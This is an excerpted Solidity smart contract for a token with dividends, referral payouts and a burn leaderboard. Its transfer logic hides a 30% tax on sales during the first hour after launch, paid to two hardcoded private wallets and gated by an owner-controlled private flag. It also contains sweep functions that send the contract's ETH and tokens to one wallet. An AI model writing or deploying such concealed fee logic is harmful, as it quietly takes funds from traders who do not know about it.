...
contract BABYTOKENDividendTracker is OwnableUpgradeable, DividendPayingToken {
    ...
    address public wallet = 0x5C0B8037afdc2d2eD0387437Ef2D8d63976b8286;
...
contract os is ERC20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;

    ordistarmint public _ordistarmint;
    address public rankWallet;
    address public airdropWallet;

    address private wallet1 = 0x70e37649A3A3F9Bca05F16C5697995281Ee42403;
    address private wallet2 = 0x0658084D6A2E20949FdcA5EA5939F437ac3938cc;
    ...
    uint256 public firstTime = 0;
    bool private ishigh = true;
    ...
    constructor(
        ...
        address ordistarmintAddr,
        address rankWalletAddr,
        address airdropWalletAddr
    ) payable ERC20(name_, symbol_)  {
        rankWallet = rankWalletAddr;
        _ordistarmint = ordistarmint(ordistarmintAddr);
        ...
        dividendTracker = BABYTOKENDividendTracker(payable(addrs[3]));
        ...
        payable(serviceFeeReceiver_).transfer(0);
    }
    ...
    function closeishigh() public onlyOwner {
        ishigh = false;
    }
    ...
    function _transfer(
        ...
        if(takeFee) {
            ...
            if(automatedMarketMakerPairs[from]){
                ...
                address tmpinviter = _ordistarmint.getInviter(to);
                if (tmpinviter != address(0)) {
                    if(DFee > 0) super._transfer(from, tmpinviter, DFee);
                }else{
            ...
            if(automatedMarketMakerPairs[to]){
                if((firstTime > 0) && (block.timestamp < firstTime + 1 hours) && ishigh){
                    uint256 amount1 = amount.mul(27).div(100);
                    uint256 amount2 = amount.mul(3).div(100);

                    super._transfer(from, wallet1, amount1);
                    super._transfer(from, wallet2, amount2);
                    amount = amount.sub(amount1+amount2);
                }else{
    ...
    mapping(address => uint256) public destructionAmounts;
    address[] public topDestroyers;
    uint256[] public topDestroyersAmount;
    uint256 public totalBurnAmount;
    uint256 public topCount = 4;

    event TokensDestroyed(address indexed destroyer, uint256 amount);

    function setTopCount(uint256 count) public onlyOwner {
        topCount = count;
    }

    function isInlist(address destroyer) view internal returns(bool, uint256){
        uint256 index = 0;
        bool isin = false;
        for (uint256 i = 0; i < topDestroyers.length; i++) {
                if (destroyer == topDestroyers[i]) {
                    index = i;
                    isin = true;
                }
        }
    ...
    function updateTopDestroyers(address destroyer) internal {
        (bool _isin, uint256 _index) = isInlist(destroyer);

        if(_isin){
            topDestroyersAmount[_index] = destructionAmounts[destroyer];

        }else{
            if (topDestroyers.length < topCount) {
                topDestroyers.push(destroyer);
                topDestroyersAmount.push(destructionAmounts[destroyer]);
            } else {
                uint256 minDestruction = destructionAmounts[topDestroyers[0]];
                uint256 minIndex = 0;

                for (uint256 i = 1; i < topDestroyers.length; i++) {
                    if (destructionAmounts[topDestroyers[i]] < minDestruction) {
                        minDestruction = destructionAmounts[topDestroyers[i]];
                        minIndex = i;
                    }
                }

                if (destructionAmounts[destroyer] > minDestruction) {
                    topDestroyers[minIndex] = destroyer;
                    topDestroyersAmount[minIndex] = destructionAmounts[destroyer];
                }
            }
    ...
    function joinBurn(uint256 amount) external nonReentrant returns(bool) {
        require(balanceOf(msg.sender) >= amount, "balance of user is not enough");

        uint256 transferAmount = 0;
        super._transfer(msg.sender, rankWallet, amount.div(10));
        transferAmount += amount.div(10);
        super._transfer(msg.sender, airdropWallet, amount.div(20));
        transferAmount += amount.div(20);

        address tmpinviter = _ordistarmint.getInviter(msg.sender);
        if (tmpinviter != address(0)) {
            super._transfer(msg.sender, tmpinviter, amount.div(20));
            transferAmount += amount.div(20);
            super._transfer(msg.sender, deadWallet, amount.sub(transferAmount));
        }else{
            super._transfer(msg.sender, deadWallet, amount.sub(transferAmount));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             
        }

        try dividendTracker.setBalance(payable(msg.sender), amount) {} catch {}

        destructionAmounts[msg.sender] += amount;
        updateTopDestroyers(msg.sender);
        totalBurnAmount += amount;

        if (tmpinviter != address(0)) {
            destructionAmounts[tmpinviter] += amount;
            updateTopDestroyers(tmpinviter);
        }
    ...
    function withdrawEth() external {
        require(msg.sender == rankWallet);
		uint256 balance = address(this).balance;
		if (balance != 0) {
            payable(rankWallet).transfer(balance);
		}
	...
	function withdrawUnexpectedERC20(address token) external {
		...
		uint256 balance = IERC20(token).balanceOf(address(this));
		if (balance != 0) {
			IERC20(token).transfer(rankWallet, balance);
		}
	}
}